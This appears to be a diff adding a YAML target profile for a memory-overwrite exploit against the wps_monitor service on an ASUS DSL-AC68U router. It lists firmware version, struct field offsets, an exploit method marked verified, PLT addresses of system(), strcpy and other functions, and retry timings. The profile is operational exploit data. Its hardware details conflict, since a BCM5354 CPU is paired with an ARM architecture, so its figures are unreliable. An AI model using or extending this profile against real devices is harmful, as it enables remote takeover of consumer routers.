@@ -1,0 +1,38 @@
+manufacturer: ASUS
+model: DSL-AC68U
+firmware: 3.0.0.4.384_56087
+architecture: arm
+cpu: BCM5354
+endianness: little
+exploit_method: send_data_overwrite
+verified: true
+offsets:
+  frags_received: '0x0000'
+  total_bytes_to_recv: '0x0800'
+  total_received: '0x0804'
+  next_frag_to_send: '0x0808'
+  frag_size: '0x080C'
+  flags: '0x0818'
+  last_sent: '0x081C'
+  last_sent_len: '0x0820'
+  send_data: '0x0838'
+plt_addresses:
+  system: '0x00009ab4'
+  malloc: '0x00009b98'
+  BN_CTX_free: '0x00009c04'
+  snprintf: '0x00009c7c'
+  fprintf: '0x00009ebc'
+  sprintf: '0x00009f28'
+  free: '0x00009f94'
+  DH_free: '0x00009fb8'
+  printf: '0x00009fc4'
+  BN_free: '0x00009ff4'
+  strcpy: '0x0000a024'
+timing:
+  calibrate_delay: 0.3
+  frag_ack_timeout: 3.0
+  resend_timer: 5.0
+notes:
+- PLT addresses extracted from wps_monitor binary
+- Verified against firmware analysis
+- ELF 32-bit ARM, stripped
